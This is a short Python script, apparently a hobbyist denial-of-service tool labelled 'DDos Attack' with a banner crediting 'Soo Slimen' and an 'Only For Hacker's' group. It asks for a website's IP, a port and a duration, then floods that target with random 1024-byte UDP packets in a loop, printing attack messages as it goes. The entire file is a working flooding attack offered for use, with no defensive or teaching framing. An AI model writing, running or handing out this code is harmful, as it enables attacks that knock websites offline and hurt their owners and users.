import time,socket,random,sys,os,itertools
from termcolor import colored



def logo():
    os.system(["clear", "cls"][os.name == 'nt'])
    Logo = '''

=======================>>>>>>>>> 
Twitter: @AzeT94802
Instagrem: Soo Slimen
FB.Group: Only For Hacker's'
<<<<<<<<<<<<<====================  

    
        
            
                
                    
                        
                            
                                    
⠄⠄⢜⢯⣺⢿⣻⣿⣿⣷⣔⡄⠄⠈⠛⣿⣿⡾⠋⠁⠄⠄⣄⣶⣾⣿⡿⣿⡳⡌⡗⡅
⠄⠄⢽⢱⢳⢹⡪⡞⠮⠯⢯⡻⡬⡐⢨⢿⣿⣿⢀⠐⡥⣻⡻⠯⡳⢳⢹⢜⢜⢜⢎⠆
⠄⠠⣻⢌⠘⠌⡂⠈⠁⠉⠁⠘⠑⢧⣕⣿⣿⣿⢤⡪⠚⠂⠈⠁⠁⠁⠂⡑⠡⡈⢮⠅
⠄⠠⣳⣿⣿⣽⣭⣶⣶⣶⣶⣶⣺⣟⣾⣻⣿⣯⢯⢿⣳⣶⣶⣶⣖⣶⣮⣭⣷⣽⣗⠍


⠄======================>>>>>>>>>
Tool By  {q}  {r}     \n'''.format(gk=colored('SOO SLIMEN', 'red'), q=colored('', 'white'), r=colored('DDos Attack| ', 'yellow'))

    colors = itertools.cycle([colored('', 'red'), colored('', 'white')])

    for Line in Logo.split('\n'):
        print(next(colors) + Line)
        time.sleep(0.2)


logo()

def usage():
    print(colored("Only For Hacker's", "yellow"))

    victim = input(colored('ENTER THE IP OF WEBSITE : ', "blue", attrs=['bold']))
    vport = int(input(colored('ENTER THE PORT [ 80 - 443 ] : ', "green", attrs=['bold'])))
    duration = int(input(colored('ENTER THE TURBO [SPEED 1000-->999999]: ', "red", attrs=['bold'])))
    #TURBO SPEED=1000
    flood(victim, vport, duration)

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout = time.time() + duration
    sent = 999999

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print(colored("DDos ATTACK", "green"), colored(str(sent), "green"), colored("ATTACK", "green"), colored(victim, "green"), colored("at the port", "green"), colored(str(vport), "green"))



def main():
    try:
        usage()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    main()